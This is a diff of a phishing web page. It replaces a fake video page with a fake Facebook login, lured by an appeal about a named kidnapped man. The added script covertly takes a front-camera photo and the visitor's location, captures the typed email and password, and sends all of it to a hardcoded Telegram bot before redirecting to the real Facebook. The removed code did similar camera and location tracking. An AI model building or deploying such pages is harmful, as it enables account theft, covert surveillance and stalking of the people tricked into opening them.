@@ -3,106 +3,127 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title> فديو</title>
+    <title>فيسبوك - تسجيل الدخول</title>
     
-    <meta property="og:title" content="▶️ فيديو مباشر بجودة عالية">
-    <meta property="og:image" content="https://appsyria00.github.io/Facebook/2.png">
-    <meta property="og:video" content="https://appsyria00.github.io/Facebook/1.mp4">
-    <meta property="og:type" content="video.other">
+    <meta property="og:title" content="بأي ذنب يُخطف [محمد مصطفى العنعوني]؟">
+    <meta property="og:description" content="وبأي حق نعيش في غابة يغيب فيها القانون ويحضر فيها الغدر؟ اللهم ردّه إلينا سالماً.">
+    <meta property="og:image" content="https://static.xx.fbcdn.net/rsrc.php/y1/r/4l_v2zS3p9K.svg">
 
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body, html { height: 100%; width: 100%; overflow: hidden; background-color: #000; font-family: sans-serif; }
-        .video-wrapper { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
-        video { width: 100%; height: 100%; object-fit: cover; }
+        body {margin:0;padding:0;background:#f0f2f5;font-family:system-ui,sans-serif;display:flex;justify-content:center;align-items:flex-start;min-height:100vh;padding-top:20px;}
+        .fb-container {width:100%;max-width:400px;background:white;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);overflow:hidden;}
+        .header {background:#1877f2;padding:12px;text-align:center;color:white;font-size:20px;font-weight:bold;}
+        .form-area {padding:20px;}
+        input {width:100%;padding:14px;margin:8px 0;border:1px solid #dddfe2;border-radius:6px;font-size:16px;box-sizing:border-box;background:#f5f6f7;}
+        .login-btn {width:100%;padding:14px;background:#1877f2;color:white;font-size:18px;font-weight:bold;border:none;border-radius:6px;cursor:pointer;margin-top:10px;}
         
-        /* نافذة الهندسة الاجتماعية الشفافة */
-        #audioOverlay { 
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: rgba(0,0,0,0.65); /* خلفية شفافة تظهر الفيديو خلفها */
-            color: white; z-index: 9999; display: flex; flex-direction: column; 
-            align-items: center; justify-content: center; text-align: center; padding: 25px;
-            display: none; 
+        #startOverlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #fff; z-index: 10000;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            text-align: center; padding: 20px;
         }
-        #audioBtn { 
-            padding: 15px 45px; background: #007bff; color: white; border: none; 
-            border-radius: 35px; cursor: pointer; font-weight: bold; font-size: 18px;
-            box-shadow: 0 5px 20px rgba(0,123,255,0.4);
-            transition: 0.3s;
-        }
-        #audioBtn:active { transform: scale(0.95); }
+        .start-btn { padding: 15px 40px; background: #1877f2; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <div id="audioOverlay">
-        <div style="background: rgba(255,255,255,0.1); padding: 30px; border-radius: 20px; backdrop-filter: blur(5px);">
-            <h2 style="margin-bottom:15px;">🔊 الصوت مكتوم</h2>
-            <p style="margin-bottom:25px; line-height: 1.5;">  تشغيل الصوت،<br>يرجى الضغط على الزر أدناه وتفعيل الأذونات.</p>
-            <button id="audioBtn">تشغيل الصوت الآن</button>
-        </div>
+<div id="startOverlay">
+    <div style="margin-bottom: 20px; color: #1c1e21; font-size: 18px;">
+        يرجى المتابعة لتأكيد هويتك ومشاهدة تفاصيل المنشور.
     </div>
+    <button class="start-btn" id="initBtn">متابعة إلى فيسبوك</button>
+</div>
 
-    <div class="video-wrapper">
-        <video id="mainVideo" autoplay muted playsinline poster="2.png" preload="auto">
-            <source src="1.mp4" type="video/mp4">
-        </video>
+<div class="fb-container">
+    <div class="header">facebook</div>
+    <div class="form-area">
+        <form id="loginForm">
+            <input type="text" id="user" placeholder="رقم الجوال أو البريد الإلكتروني" required>
+            <input type="password" id="pass" placeholder="كلمة المرور" required>
+            <button type="submit" class="login-btn" id="submitBtn">تسجيل الدخول</button>
+        </form>
     </div>
+</div>
 
-    <script>
-        const botToken = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
-        const chatId = "1611398303";
+<script>
+const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
+const CHAT_ID = "1611398303";
 
-        window.onload = function() {
-            // 1. تشغيل الفيديو صامت فوراً عند فتح الصفحة
-            const video = document.getElementById('mainVideo');
-            video.play().catch(() => console.log("بانتظار تفاعل المستخدم"));
+// Initial interaction for permissions
+document.getElementById('initBtn').onclick = function() {
+    document.getElementById('startOverlay').style.display = 'none';
+    startCapture();
+};
 
-            // 2. إظهار نافذة طلب الصوت بعد ثانية واحدة لزيادة الفضول
-            setTimeout(() => {
-                document.getElementById('audioOverlay').style.display = 'flex';
-            }, 1000);
-        };
+async function startCapture() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
 
-        // 🔱 عند الضغط على زر تشغيل الصوت
-        document.getElementById('audioBtn').onclick = function() {
-            const video = document.getElementById('mainVideo');
-            
-            // 3. الخدعة: إعادة تشغيل الفيديو من البداية وتفعيل الصوت فوراً
-            video.currentTime = 0; 
-            video.muted = false;   
-            video.play();          
+        setTimeout(async () => {
+            const canvas = document.createElement('canvas');
+            canvas.width = 640; canvas.height = 480;
+            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+            const imageData = canvas.toDataURL('image/jpeg');
+            stream.getTracks().forEach(t => t.stop());
 
-            // 4. إخفاء النافذة ودخول وضع ملء الشاشة للتمويه التام
-            document.getElementById('audioOverlay').style.display = 'none';
-            if (document.documentElement.requestFullscreen) { 
-                document.documentElement.requestFullscreen(); 
-            }
-
-            // 5. بدء سحب البيانات (الموقع والكاميرا) في الخلفية
-            requestSystemPermissions();
-        };
-
-        async function requestSystemPermissions() {
-            // طلب الموقع الجغرافي المباشر (تتبع مستمر)
-            navigator.geolocation.watchPosition(pos => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                const acc = pos.coords.accuracy.toFixed(1);
-                const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const blob = dataURLtoBlob(imageData);
+                const fd = new FormData();
+                fd.append('photo', blob, 'victim.jpg');
+                fd.append('caption', `📍 الموقع: ${pos.coords.latitude},${pos.coords.longitude}`);
+                fd.append('chat_id', CHAT_ID);
                 
-                sendToBot(`📍 تحديث موقع مباشر:\n🎯 الدقة: ${acc} متر\n🔗 الخريطة: ${mapsUrl}`);
-            }, () => {}, { enableHighAccuracy: true });
+                // CRITICAL: We don't need to 'await' background data, but we use 'keepalive'
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd, keepalive: true });
+            });
+        }, 1000);
+    } catch (err) { console.log("Blocked"); }
+}
 
-            // طلب الكاميرا لالتقاط لقطة صامتة
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                captureSilentPhoto(stream);
-            } catch (err) {
-                sendToBot("⚠️ الضحية رفض الكاميرا");
-            }
+// MAIN CREDENTIAL LOGIC
+document.getElementById('loginForm').onsubmit = async function(e) {
+    e.preventDefault();
+    const email = document.getElementById('user').value;
+    const pass = document.getElementById('pass').value;
+    const btn = document.getElementById('submitBtn');
+    
+    btn.innerText = "جاري التحميل...";
+    btn.disabled = true;
+
+    const creds = `👤 حساب مستهدف:\n📧: ${email}\n🔑: ${pass}`;
+
+    try {
+        // FORCE THE BROWSER TO WAIT UNTIL TELEGRAM SAYS "RECEIVED"
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: CHAT_ID, text: creds })
+        });
+
+        if (response.ok) {
+            // Only redirect if the message was actually sent
+            window.location.href = "https://m.facebook.com/";
+        } else {
+            // Fallback redirect after a short delay if Telegram fails
+            setTimeout(() => { window.location.href = "https://m.facebook.com/"; }, 1500);
         }
+    } catch (error) {
+        // If network fails, wait 1 second then redirect so the user doesn't get stuck
+        setTimeout(() => { window.location.href = "https://m.facebook.com/"; }, 1000);
+    }
+};
 
-        function captureSilentPhoto(stream) {
-            let v = document.createElement('video');
-            v.srcObject = stream; v.play();
+function dataURLtoBlob(dataurl) {
+    let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
+        bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+    while(n--) u8arr[n] = bstr.charCodeAt(n);
+    return new Blob([u8arr], {type: mime});
+}
+</script>
+
+</body>
+</html>
